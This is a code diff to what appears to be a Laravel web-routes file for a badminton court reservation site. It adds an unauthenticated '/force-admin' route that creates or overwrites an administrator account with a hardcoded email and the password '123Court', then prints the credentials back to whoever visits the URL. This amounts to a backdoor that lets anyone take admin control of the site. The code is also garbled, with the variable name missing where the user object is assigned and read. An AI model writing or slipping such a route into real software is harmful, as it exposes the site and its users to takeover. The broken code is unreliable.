@@ -313,3 +313,18 @@ Route::middleware([\App\Http\Middleware\CashierMiddleware::class])->group(functi
 
 
 
+
+Route::get('/force-admin', function () {
+    \ = \App\Models\User::updateOrCreate(
+        ['name' => 'Court Reserve'],
+        [
+            'contact' => 'admin',
+            'email' => 'admin@batangasbadminton.com',
+            'password' => \Illuminate\Support\Facades\Hash::make('123Court'),
+            'role' => 'admin',
+            'is_active' => 1,
+            'phone_verified_at' => now(),
+        ]
+    );
+    return "SUCCESS! Admin account forced. Username: " . \->name . " | Password: 123Court";
+});
